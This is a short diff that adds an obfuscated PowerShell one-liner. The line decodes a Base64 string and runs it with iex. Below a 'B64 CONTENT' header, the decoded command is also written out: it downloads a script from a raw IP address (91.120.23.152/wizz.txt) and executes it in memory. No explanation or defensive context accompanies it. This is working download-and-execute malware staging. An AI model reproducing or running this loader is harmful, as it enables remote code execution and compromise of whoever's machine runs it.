@@ -1,0 +1,7 @@
+iex([systEM.text.eNcODInG]::utf8.geTString([SysTeM.ConVErt]::FrOmbase64sTRinG('CklFWCAoTmV3LU9iamVjdCBuZXQud0VCY2xpRW50KS5kb1dObE9hZFN0UklORygnaHR0cDovLzkxLjEyMC4yMy4xNTIvd2l6ei50eHQnKQoK')));exit
+
+##### B64 CONTENT #####
+
+
+IEX (New-Object net.wEBcliEnt).doWNlOadStRING('http://91.120.23.152/wizz.txt')
+
